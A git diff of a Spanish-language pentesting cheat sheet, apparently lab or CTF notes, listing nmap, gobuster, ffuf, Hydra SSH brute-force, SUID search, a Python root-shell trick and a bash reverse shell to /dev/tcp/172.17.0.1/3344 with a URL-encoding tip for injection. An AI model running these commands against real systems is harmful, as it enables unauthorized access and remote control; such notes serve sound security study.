@@ -18,6 +18,8 @@ nmap -p- --open -A -sS -Pn -n <IP>
     -n: no resuelve nombres DNS. 
 ```
 
+---
+
 ### 🪓 Gobuster
 Hace fuzzing para encontrar directorios o archivos ocultos.
 ```
@@ -27,6 +29,8 @@ gobuster dir -u http://<IP>/ -w /usr/share/wordlists/dirbuster/directory-list-2.
 
     -x: extensiones que queremos probar.
 ```
+
+---
 
 ### 🏹 Ffuf
 Fuzzing para probar parámetros o rutas.
@@ -39,6 +43,8 @@ ffuf -c -t 200 -fc 404 -w /usr/share/wordlists/seclists/Discovery/Web-Content/di
     
     -u: URL con FUZZ donde se probarán los valores.
 ```
+
+---
 
 ### 🔐 Hydra
 Fuerza bruta contra servicios de autenticación.
@@ -61,6 +67,8 @@ hydra -L usuarios.txt -p purpl3 -I ssh://172.17.0.2 -V -F -u
 
 ```
 
+---
+
 ###  🔎 Find permisos SUID
 Busca archivos ejecutables con bit SUID activado (ejecutables con privilegios del dueño).
 ```
@@ -76,12 +84,16 @@ find / -perm -4000 -user root 2>/dev/null
 
 ```
 
+---
+
 ### 🐍 Python Shell Escalation
 Ejecuta una shell Bash desde un script Python, útil para escalar privilegios si se ejecuta como root.
 ```
 import os;
 os.system("/bin/bash")
 ```
+
+---
 
 ### 📡 Reverse Shell + Canal de Escucha
 Permite tomar control remoto de una máquina: se abre un listener (atacante) y se conecta desde la víctima.
@@ -104,3 +116,16 @@ Ejecuta una shell interactiva que redirige entrada/salida hacia la IP del atacan
 bash -c "bash -i >& /dev/tcp/172.17.0.1/3344 0>&1"
 ```
 > 🧠 Nota: Si se lanza desde navegador o HTTP (por ejemplo en una URL), reemplaza & por %26 para evitar que se corte el comando.
+
+---
+
+🎨 Ajustes de Terminal Remota
+Configura el entorno de shell para una mejor compatibilidad y apariencia al conectarse por SSH o shells limitadas.
+```
+export TERM=xterm-256color
+export SHELL=/bin/sh
+source /etc/skel/.bashrc
+```
+
+
+
